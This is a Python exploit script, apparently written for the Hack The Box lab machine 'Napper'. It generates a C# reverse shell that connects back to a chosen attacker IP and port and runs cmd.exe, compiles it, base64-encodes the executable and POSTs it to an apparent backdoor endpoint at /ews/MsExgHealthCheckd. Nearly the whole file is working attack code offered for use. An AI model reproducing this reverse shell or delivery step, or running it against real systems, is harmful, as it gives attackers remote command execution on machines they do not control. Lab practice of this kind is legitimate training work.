import time
import encodings.base64_codec
import requests
import requests.utils
from urllib.parse import quote
host = "napper.htb"
import base64
import os

host_url = input("Host Url (example= http://target.com):")
local_host = input("Local IP for listener: ")
local_port = input("Local port for listener: ")

csproj_content = """
<Project Sdk="Microsoft.NET.Sdk">

  <PropertyGroup>
    <OutputType>Exe</OutputType>
    <TargetFramework>net8.0</TargetFramework>
    <ImplicitUsings>enable</ImplicitUsings>
    <Nullable>enable</Nullable>
  </PropertyGroup>

</Project>
"""


rev_payload = f"""
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;

namespace Program
{{
 public class Run
 {{
  static StreamWriter streamWriter;

  public Run()
  {{
   using(TcpClient client = new TcpClient("{local_host}", {local_port}))
   {{
    using(Stream stream = client.GetStream())
    {{
     using(StreamReader rdr = new StreamReader(stream))
     {{
      streamWriter = new StreamWriter(stream);

      StringBuilder strInput = new StringBuilder();

      Process p = new Process();
      p.StartInfo.FileName = "cmd";
      p.StartInfo.CreateNoWindow = true;
      p.StartInfo.UseShellExecute = false;
      p.StartInfo.RedirectStandardOutput = true;
      p.StartInfo.RedirectStandardInput = true;
      p.StartInfo.RedirectStandardError = true;
      p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
      p.Start();
      p.BeginOutputReadLine();

      while(true)
      {{
       strInput.Append(rdr.ReadLine());
       p.StandardInput.WriteLine(strInput);
       strInput.Remove(0, strInput.Length);
      }}
     }}
    }}
   }}
  }}

  public static void Main(string[] args)
  {{
   new Run();
  }}

  private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {{
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {{
                try
                {{
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }}
                catch (Exception err) {{ }}
            }}
        }}
 }}
}}
"""

try:
    os.system("rm -rf Program.csproj")
    os.system("rm -rf Program.cs")
except:
    pass

#os.system("touch Program.csproj")
#os.system("touch Program.cs")

with open("Program.csproj", "w") as csproj_file:
    csproj_file.write(csproj_content)

# Write rev_payload to Program.cs
with open("Program.cs", "w") as cs_file:
    cs_file.write(rev_payload)

os.system("mcs -out:Program.exe Program.cs")
time.sleep(10)
print("Converted")
with open("./Program.exe", "rb") as file:
    data = file.read()
    encr = base64.b64encode(data)
    encr = (quote(encr,safe=""))
    form = f"sdafwe3rwe23={encr}"
    print(form)
    url_ssl = f"{host_url}/ews/MsExgHealthCheckd"

    myres = requests.post(url_ssl,data=form,verify=False)
    print(myres.status_code)
